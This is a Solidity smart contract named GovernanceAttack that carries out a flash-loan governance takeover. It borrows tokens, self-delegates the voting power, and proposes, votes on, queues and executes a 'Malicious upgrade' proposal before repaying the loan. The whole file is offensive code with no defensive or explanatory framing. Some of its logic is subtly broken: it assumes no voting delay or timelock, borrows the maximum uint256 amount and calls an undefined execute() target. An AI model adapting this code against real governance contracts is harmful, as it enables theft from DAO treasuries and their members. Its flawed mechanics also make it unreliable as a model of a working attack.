
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IFlashLoan {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

interface IGovernor {
    function propose(address[] memory targets, uint256[] memory values, bytes[] memory calldatas, string memory description) external returns (uint256);
    function castVote(uint256 proposalId, bool support) external;
    function queue(uint256 proposalId) external;
    function execute(uint256 proposalId) external payable;
}

interface IToken {
    function delegate(address delegatee) external;
    function getVotes(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract GovernanceAttack {
    IFlashLoan public lender;
    IGovernor public governor;
    IToken public token;
    
    constructor(address _lender, address _governor, address _token) {
        lender = IFlashLoan(_lender);
        governor = IGovernor(_governor);
        token = IToken(_token);
    }
    
    function attack() external {
        // Step 1: Borrow voting power via flash loan
        lender.flashLoan(address(this), address(token), type(uint256).max, "");
    }
    
    function onFlashLoan(address token_, uint256 amount, bytes calldata data) external {
        // Step 2: Delegate to self
        IToken(token_).delegate(address(this));
        
        // Step 3: Create and vote on malicious proposal
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        
        targets[0] = address(this);  // Malicious target
        values[0] = 0;
        calldatas[0] = abi.encodeWithSignature("execute()");
        
        uint256 proposalId = governor.propose(targets, values, calldatas, "Malicious upgrade");
        
        // Step 4: Vote
        governor.castVote(proposalId, true);
        
        // Step 5: Queue and execute
        governor.queue(proposalId);
        governor.execute(proposalId);
        
        // Step 6: Repay flash loan
        IToken(token).transfer(msg.sender, amount);
    }
}
